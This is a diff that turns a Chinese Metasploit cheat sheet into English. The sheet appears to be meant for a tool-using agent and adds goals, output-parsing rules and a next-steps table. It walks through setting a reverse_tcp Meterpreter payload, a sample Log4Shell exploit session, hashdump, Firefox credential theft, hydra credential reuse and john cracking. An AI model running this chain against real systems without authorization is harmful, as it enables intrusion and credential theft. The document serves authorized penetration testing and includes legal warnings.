@@ -1,45 +1,49 @@
-# Metasploit Framework - 渗透测试框架
+# Metasploit Framework - Penetration Testing Framework
 
-## 概述
-| 属性 | 值 |
-|------|-----|
-| 二进制 | `msfconsole` |
-| 类别 | 漏洞利用、后渗透 |
-| 风险等级 | 高 |
+## Overview
+| Attribute | Value |
+|-----------|-------|
+| Binary | `msfconsole` |
+| Category | Exploitation, Post-Exploitation |
+| Risk Level | High |
 
-## 描述
-Metasploit Framework 是最流行的渗透测试框架，提供漏洞利用、Payload 生成、后渗透模块等功能。
+## Description
+Metasploit Framework is the most widely used penetration testing framework, providing exploit modules, payload generation, post-exploitation tools, and auxiliary scanners for comprehensive security assessments.
 
 ---
 
-## 基础命令
+## Basic Commands
 
-### 1. 启动控制台
+### 1. Launch Console
 ```bash
 msfconsole
 ```
 
-### 2. 搜索模块
+### 2. Search Modules
+**Goal:** Find exploits, auxiliaries, or payloads by name, CVE, or platform.
 ```bash
 search type:exploit name:apache
 search cve:2021-44228
 search platform:linux type:exploit
 ```
 
-### 3. 使用模块
+### 3. Use a Module
+**Goal:** Select and load a module for configuration.
 ```bash
 use exploit/multi/handler
 use auxiliary/scanner/ssh/ssh_login
 ```
 
-### 4. 查看选项
+### 4. View Options
+**Goal:** See configurable parameters and available payloads.
 ```bash
 show options
 show payloads
 show targets
 ```
 
-### 5. 设置参数
+### 5. Set Parameters
+**Goal:** Configure target, payload, and listener settings.
 ```bash
 set RHOSTS 192.168.1.1
 set RPORT 445
@@ -47,7 +51,8 @@ set LHOST 192.168.1.100
 set PAYLOAD linux/x64/meterpreter/reverse_tcp
 ```
 
-### 6. 执行
+### 6. Execute
+**Goal:** Run the configured exploit or auxiliary module.
 ```bash
 exploit
 run
@@ -55,48 +60,95 @@ run
 
 ---
 
-## 常用模块类型
-| 类型 | 说明 |
-|------|------|
-| `exploit` | 漏洞利用 |
-| `auxiliary` | 辅助模块（扫描、嗅探等） |
-| `payload` | 攻击载荷 |
-| `post` | 后渗透模块 |
-| `encoder` | 编码器 |
+## Module Types
+| Type | Description |
+|------|-------------|
+| `exploit` | Vulnerability exploitation modules |
+| `auxiliary` | Scanning, fingerprinting, fuzzing modules |
+| `payload` | Code delivered to the target upon exploitation |
+| `post` | Post-exploitation modules (data gathering, pivoting) |
+| `encoder` | Payload encoding for evasion |
 
 ---
 
-## 常用辅助模块
+## Common Auxiliary Modules
 ```bash
-# SSH 暴力破解
+# SSH Brute-force
 use auxiliary/scanner/ssh/ssh_login
 
-# SMB 扫描
+# SMB Version Scanning
 use auxiliary/scanner/smb/smb_version
 
-# 端口扫描
+# TCP Port Scanning
 use auxiliary/scanner/portscan/tcp
 ```
 
 ---
 
-## Meterpreter 常用命令
+## Meterpreter Common Commands
 ```bash
-sysinfo          # 系统信息
-getuid           # 当前用户
-ps               # 进程列表
-shell            # 系统 shell
-upload/download  # 文件传输
-hashdump         # 导出哈希
+sysinfo          # System information
+getuid           # Current user
+ps               # Process list
+shell            # Drop to system shell
+upload/download  # File transfer
+hashdump         # Dump password hashes
 ```
 
 ---
 
-## 安全提示
-| 风险 | 说明 |
-|------|------|
-| **高危** | 可执行任意代码 |
-| **法律** | 未授权使用违法 |
-| **检测** | 易被 IDS/EDR 检测 |
+## Output Parsing
 
-> **警告**：仅在获得书面授权的目标上使用
+### Sample Output
+```
+msf6 > search type:exploit name:log4j
+
+Matching Modules
+================
+
+   #  Name                                          Disclosure Date  Rank       Check  Description
+   -  ----                                          ---------------  ----       -----  -----------
+   0  exploit/multi/http/log4shell_header_injection  2021-12-09       excellent  Yes    Log4Shell HTTP Header Injection
+
+msf6 exploit(multi/http/log4shell_header_injection) > exploit
+
+[*] Started reverse TCP handler on 192.168.1.100:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable.
+[*] Sending stage (58829 bytes) to 192.168.1.10
+[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.10:42345)
+
+meterpreter >
+```
+
+### Parsing Rules
+- `[*]` = informational messages
+- `[+]` = success / positive finding
+- `[-]` = failure
+- `[!]` = warning
+- `Matching Modules` table = search results with rank and check support
+- `show options` = required parameters for the module
+- `session X opened` = **successful exploitation**
+
+---
+
+## Next Steps
+
+| Finding | Recommended Next Tool | Example |
+|---------|----------------------|---------|
+| Session opened | Post-exploitation modules | `use post/multi/gather/firefox_creds` |
+| Exploit found but failed | Try alternative exploit | `search type:exploit name:<service>` |
+| Auxiliary scan results | `nmap` for deeper service scan | `nmap -sV -sC <target>` |
+| Credentials found | `hydra` to test credential reuse | `hydra -l user -p pass target ssh` |
+| Hash dump obtained | Offline cracking | `john --wordlist=rockyou.txt hashes.txt` |
+
+---
+
+## Safety Warnings
+| Risk | Description |
+|------|-------------|
+| **High Impact** | Exploits execute arbitrary code on target systems. |
+| **Legal** | Unauthorized use is illegal and can result in prosecution. |
+| **Detection** | Exploit traffic is easily detected by IDS/EDR solutions. |
+
+> **Warning:** Only use on targets with explicit written authorization.
